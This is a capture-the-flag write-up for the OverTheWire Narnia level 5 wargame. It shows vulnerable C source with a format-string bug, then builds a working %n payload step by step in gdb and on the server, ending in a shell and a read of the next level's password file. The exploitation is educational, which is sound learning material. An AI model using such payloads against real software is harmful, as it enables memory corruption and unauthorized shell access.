#Narnia5

narnia.labs.overthewire.org

**Username:** narnia5
**Password:** see [narnia4](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria4)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Just running the program provides us a little bit of a hint.
>
>```
# ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffb60dbc)
>```
>
> Peeking at the code we see:
>
>```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
>
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
>
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
> 
int main(int argc, char **argv){
	int i = 1;
	char buffer[64];
>
	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");
>
	if(i==500){
		printf("GOOD\n");
		system("/bin/sh");
	}
>
	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
>```
> 
> Ok, looks like we need to manipulate the value of ```i```.  There is a lot of ```printf``` usage.  Let's try some basic string format entries.
>
>```
# ./narnia5 %x%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f76b9960ffb1f4e6] (16)
i = 1 (0xffb1f50c)
>```
>
> Looks like the right track.  Let's see if we can find our way back up the stack to our input.
>
>```
(gdb) run $(python -c 'print "AAAA"')%x%x%x%x%x%x%x
Starting program: /root/narnia5 $(python -c 'print "AAAA"')%x%x%x%x%x%x%x
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7ed8960ffffd4c6f7e86315ffffd4c7414141416465376630363938] (60)
i = 1 (0xffffd4ec)
[Inferior 1 (process 7402) exited normally]
(gdb) run $(python -c 'print "AAAA"')%x%x%x%x%x
Starting program: /root/narnia5 $(python -c 'print "AAAA"')%x%x%x%x%x
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7ed8960ffffd4c6f7e86315ffffd4c741414141] (44)
i = 1 (0xffffd4ec)
[Inferior 1 (process 7399) exited normally]
>```
>
> Looks like we have to read 5 times before we get back to our input.  They are already giving us the location of ```i``` as ```0xffffd4ec```, so we should be able to move directly into trying to overwrite the value.  To do this we'll use the ```%n``` format as it ```writes the number of bytes written so far```.  We can specify the address to change by inserting it at the begining of our input and using ```%x``` to get back to it.  Then all we need to do is insert the correct number of bytes and we should be able to overwrite ```i``` with the value ```500```.
>
>```
(gdb) run $(python -c 'print "\xec\xd4\xff\xff"')%08x%08x%08x%08x%n
Starting program: /root/narnia5 $(python -c 'print "\xec\xd4\xff\xff"')%08x%08x%08x%08x%n
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����f7ed8960ffffd4c6f7e86315ffffd4c7] (36)
i = 36 (0xffffd4ec)
>```
>
> By switching to ```%n``` we can see that we change the value of ```i``` from 1 to 36 so everything appears to be working as expected.  Let's go straight for 500.
>
>```
[Inferior 1 (process 7340) exited normally]
(gdb) run $(python -c 'print "\xec\xd4\xff\xff"+"A"*464')%08x%08x%08x%08x%n
Starting program: /root/narnia5 $(python -c 'print "\xec\xd4\xff\xff"+"A"*464')%08x%08x%08x%08x%n
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 1 (0xffffd31c)
[Inferior 1 (process 7344) exited normally]
>```
>
> Padded 464 ```A``` to make a total of 500, but it looks like our address for ```i``` has moved.  Let's update that address and try the same payload.
>
>```
(gdb) run $(python -c 'print "\x1c\xd3\xff\xff"+"A"*464')%08x%08x%08x%08x%n
Starting program: /root/narnia5 $(python -c 'print "\x1c\xd3\xff\xff"+"A"*464')%08x%08x%08x%08x%n
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
Change i's value from 1 -> 500. GOOD
# whoami
root
>```
>
> That looks better.  We are in gdb on the local box.  Let's go see if we can reproduce this on the server.
>
>```
narnia5@melinda:/narnia$ ./narnia5 $(python -c 'print "\x1c\xd3\xff\xff"+"A"*464')%08x%08x%08x%08x%n
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 1 (0xffffd50c)
>```
>
> Address for ```i``` changed again.  We know what to do.
>
>```
narnia5@melinda:/narnia$ ./narnia5 $(python -c 'print "\x0c\xd5\xff\xff"+"A"*464')%08x%08x%08x%08x%n
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
**********
$ 
>```
>
> Man that never gets old.  On to narnia6.
